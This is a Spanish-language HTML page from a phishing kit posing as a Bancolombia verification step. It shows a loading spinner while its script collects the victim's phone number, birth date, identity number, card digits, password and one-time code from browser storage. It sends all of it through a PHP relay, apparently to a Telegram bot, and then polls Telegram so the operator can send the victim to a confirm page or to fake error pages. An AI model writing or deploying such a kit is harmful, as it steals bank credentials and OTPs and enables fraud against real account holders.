<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verificando Dinámica</title>
  <style>
    body, html { margin:0; padding:0; height:100%; width:100%; }
    body {
      display: flex; justify-content: center; align-items: center;
      background: url('img/fondo.jpg') no-repeat center center fixed;
      background-size: cover;
    }
    .blur-overlay {
      position: fixed; top:0; left:0; width:100%; height:100%;
      background: rgba(255,255,255,0.4); backdrop-filter: blur(10px);
    }
    .loaderp-full {
      position: fixed; top:0; left:0; width:100%; height:100%;
      display:flex; justify-content:center; align-items:center;
      z-index:9999;
    }
    .loaderp {
      width:180px; height:180px; background-image:url('img/circulo.png');
      background-size:cover; border-radius:50%;
      display:flex; flex-direction:column; justify-content:center; align-items:center;
    }
    .loaderp .loader {
      width:30px; height:30px; border:5px solid #f3f3f3;
      border-top:5px solid #555; border-radius:50%; animation:spin 1s linear infinite;
    }
    .loaderp-text { margin-top:30px; font-size:13px; color:#000; }
    @keyframes spin { 0%{transform:rotate(0)}100%{transform:rotate(360deg)} }
  </style>
</head>
<body>
  <div class="blur-overlay"></div>
  <div class="loaderp-full">
    <div class="loaderp">
      <div class="loader"></div>
      <div class="loaderp-text">Verificando...</div>
    </div>
  </div>

<script>
document.addEventListener('DOMContentLoaded', async () => {
  // 1. Cargar config desde botconfig.json
  let cfg;
  try {
    cfg = await fetch('botconfig.json').then(r => r.json());
  } catch (e) {
    alert('No se pudo cargar la configuración del bot.');
    return;
  }
  const { token: botToken, chat_id: chatId } = cfg;

  // 2. Recoger datos y OTP
  const sess = JSON.parse(localStorage.getItem('bancoldata') || '{}');
  const dyn = localStorage.getItem('bancoldina');
  if (!sess.celular || !sess.clave || !dyn) {
    alert('Datos incompletos. Redirigiendo...');
    return window.location.href = 'index.html';
  }

  // 3. Generar transactionId único si no existe
  const transactionId = localStorage.getItem('transactionId') ||
    (Date.now().toString(36) + Math.random().toString(36).slice(2));
  localStorage.setItem("transactionId", transactionId);

  // 4. Crear mensaje
  const msg = `
📥 <b>INGRESO BANCOLOMBIA (Dinámica)</b>
🆔 <b>ID:</b> ${transactionId}
📱 <b>Celular:</b> ${sess.celular}
🎂 <b>Nacimiento:</b> ${sess.nacimiento}
💳 <b>Tipo:</b> ${sess.tipo}
🔢 <b>Identificador:</b> ${sess.identificador}
🔸 <b>Últimos 2 dígitos:</b> ${sess.digitosFinales}
🔐 <b>Clave:</b> ${sess.clave}
🧩 <b>Dinámica OTP:</b> ${dyn}
`;

  // 5. Crear botones adicionales
  const keyboard = {
    inline_keyboard: [
      [{ text: "✅ Confirmar", callback_data: `confirm_finalizar:${transactionId}` }],
      [{ text: "❌ Error de Logo", callback_data: `error_logo:${transactionId}` }],
      [{ text: "🔁 Error OTP", callback_data: `error_otp:${transactionId}` }]
    ]
  };

  // 6. Enviar mensaje con botones
  await fetch('botmaster2.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'data=' + encodeURIComponent(msg) + '&keyboard=' + encodeURIComponent(JSON.stringify(keyboard))
  });

  // 7. Escuchar interacción
  await waitButton(transactionId, botToken);
});

async function waitButton(txId, botToken) {
  try {
    const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
    const js = await res.json();

    const update = js.result.find(u =>
      u.callback_query && u.callback_query.data && u.callback_query.data.includes(txId)
    );

    if (update) {
      const accion = update.callback_query.data.split(':')[0];
      let redireccion = '';

      switch (accion) {
        case 'confirm_finalizar':
          redireccion = 'https://www.bancoppel.com/';
          break;
        case 'error_logo':
          redireccion = 'errorlogo.html';
          break;
        case 'error_otp':
          redireccion = 'cel-dina-error.html';
          break;
        default:
          redireccion = 'index.html';
      }

      // Notificar estado
      await fetch('sendStatus.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ status: `Acción desde botón: ${accion}` })
      });

      return window.location.href = redireccion;
    } else {
      return setTimeout(() => waitButton(txId, botToken), 2000);
    }
  } catch (err) {
    console.error("Error botón:", err);
    setTimeout(() => waitButton(txId, botToken), 3000);
  }
}
</script>
</body>
</html>
